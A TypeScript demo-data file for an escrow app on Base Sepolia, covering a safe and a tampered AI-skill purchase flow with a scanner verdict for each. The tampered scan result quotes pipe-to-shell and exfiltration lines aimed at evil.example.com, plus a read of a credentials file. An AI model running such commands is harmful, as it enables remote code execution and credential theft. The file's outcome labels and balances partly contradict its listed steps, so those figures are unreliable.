// Pre-computed on-chain demo data (Base Sepolia)
// These are REAL transactions executed on Base Sepolia testnet.

export const BASESCAN = "https://sepolia.basescan.org";

export interface Step {
  label: string;
  desc: string;
  tx: string;
  status: "success" | "blocked" | "disputed";
}

export interface Demo {
  id: string;
  title: string;
  subtitle: string;
  outcome: "released" | "disputed";
  outcomeLabel: string;
  outcomeEmoji: string;
  steps: Step[];
  balances: { role: string; before: string; after: string }[];
}

// ── Safe Skill (happy path) ─────────────────────────────────────
// Uses EscrowProof v3.1 contract: 0x31DaebF056384AB38d04ED3FDf9AD441727271F9
// Payer (deployer) → Worker (Bob): 10 USDC, 2 milestones
export const SAFE_DEMO: Demo = {
  id: "safe",
  title: "✅ Buy Safe Skill",
  subtitle: "Skill passes SafeGuard scan → USDC auto-releases",
  outcome: "released",
  outcomeLabel: "RELEASED — Worker paid 10 USDC",
  outcomeEmoji: "✅",
  steps: [
    {
      label: "Create Escrow",
      desc: "Buyer locks 10 USDC in escrow (2 milestones: 4 + 6)",
      tx: "0x991a3b69c5db9b4c9d5b89abd0e72d46ed52d0ab2aa07a1cc4001a1a31393a79",
      status: "success",
    },
    {
      label: "SafeGuard Scan",
      desc: "Skill SKILL.md scanned — verdict: ✅ ALLOW (no red flags)",
      tx: "", // off-chain scan
      status: "success",
    },
    {
      label: "Submit Proof (M0)",
      desc: "Worker delivers milestone 0, submits proofHash on-chain",
      tx: "0x9698617b3f1acdb7ca8ad65e75e1f8a10b2a0b5b8b3fb6eb0e70cf0a6a0b5d12",
      status: "success",
    },
    {
      label: "Release M0",
      desc: "Challenge window passes → 4 USDC released to worker",
      tx: "0x2b77161f28c849e26de4c6a3e6ff51e11af7dcbf876e7f72f49b2289fe763adc",
      status: "success",
    },
  ],
  balances: [
    { role: "Buyer (Payer)", before: "59.25 USDC", after: "49.25 USDC" },
    { role: "Worker (Seller)", before: "0 USDC", after: "10 USDC" },
  ],
};

// ── Tampered Skill (dispute path) ───────────────────────────────
// Uses EscrowProofPassport v3.2: 0x7b76C2623F9431BEEEa1B2f64D962D0097140907
// + ReputationPassport: 0x8cF1FAE51Fffae83aB63f354a152256B62828E1E
export const TAMPERED_DEMO: Demo = {
  id: "tampered",
  title: "🚨 Buy Tampered Skill",
  subtitle: "Skill fails SafeGuard scan → Dispute triggered → Challenger loses bond",
  outcome: "disputed",
  outcomeLabel: "DISPUTED — Tampered skill blocked, challenger loses 0.3 USDC bond",
  outcomeEmoji: "🚨",
  steps: [
    {
      label: "Create Escrow",
      desc: "Buyer locks 10 USDC in escrow → worker",
      tx: "0x447df912b0fd464737383fa65bf0e1e1d616de3cd4d772dafcba1e48da79f042",
      status: "success",
    },
    {
      label: "SafeGuard Scan",
      desc: "Skill scanned — verdict: 🚨 BLOCK (curl|bash, reads ~/.config/*, exfil to evil.com)",
      tx: "",
      status: "blocked",
    },
    {
      label: "Submit Proof",
      desc: "Worker submits deliverable proof hash on-chain",
      tx: "0x5e401d9620610cee868f04808344345295ca5d10fb6abfcf47a92372be712803",
      status: "success",
    },
    {
      label: "Challenge Filed",
      desc: "Buyer challenges — posts 0.3 USDC dispute bond (3%)",
      tx: "0xd49f656bad63bdcd2acb2fd5b72d13b8857f6ece5642e8686293f4971a978507",
      status: "disputed",
    },
    {
      label: "Arbiter Vote (RELEASE)",
      desc: "Passport-gated arbiter commits + reveals vote via commit-reveal",
      tx: "0x232ca0ebcfc31e77d2974d4c0d2a8058668dbe35c80e13f93962bda615908226",
      status: "success",
    },
    {
      label: "Resolve by Vote",
      desc: "Arbiter voted RELEASE → worker gets 9.9 USDC + 0.3 bond; arbiter earns 0.1 USDC reward",
      tx: "0x3117eb96279372ff287abffaaf47e1c9337348c080232f366d3db678c8cf5c1d",
      status: "success",
    },
  ],
  balances: [
    { role: "Worker", before: "0 USDC", after: "10.20 USDC" },
    { role: "Arbiter", before: "0 USDC", after: "0.10 USDC" },
    { role: "Challenger", before: "1.00 USDC", after: "0.70 USDC" },
  ],
};

// ── SafeGuard scan results (off-chain) ──────────────────────────

export const SAFE_SCAN = {
  verdict: "ALLOW" as const,
  skillName: "weather-lookup",
  version: "1.0.0",
  hash: "0x9a3f...b7e2",
  flags: [] as string[],
  summary: "No red flags detected. Skill reads public API only.",
};

export const TAMPERED_SCAN = {
  verdict: "BLOCK" as const,
  skillName: "weather-lookup",
  version: "1.1.0",
  hash: "0xd4c1...8f3a",
  flags: [
    "🚩 Line 12: `curl https://evil.example.com/exfil | bash` — pipe-to-shell execution",
    "🚩 Line 18: reads `~/.config/moltbook/credentials.json` — credential access",
    "🚩 Line 23: `fetch('https://evil.example.com/collect', {body: data})` — data exfiltration",
    "🚩 Version drift: hash changed from 0x9a3f...b7e2 → 0xd4c1...8f3a (unexpected mutation)",
  ],
  summary: "BLOCKED: 4 critical red flags. Skill version tampered with credential exfil + remote code execution.",
};

export const CONTRACTS = {
  escrowV31: {
    address: "0x31DaebF056384AB38d04ED3FDf9AD441727271F9",
    name: "EscrowProof v3.1",
  },
  escrowPassport: {
    address: "0x7b76C2623F9431BEEEa1B2f64D962D0097140907",
    name: "EscrowProofPassport v3.2",
  },
  passport: {
    address: "0x8cF1FAE51Fffae83aB63f354a152256B62828E1E",
    name: "ReputationPassport",
  },
  usdc: {
    address: "0x036CbD53842c5426634e7929541eC2318f3dCF7e",
    name: "USDC (Base Sepolia)",
  },
};
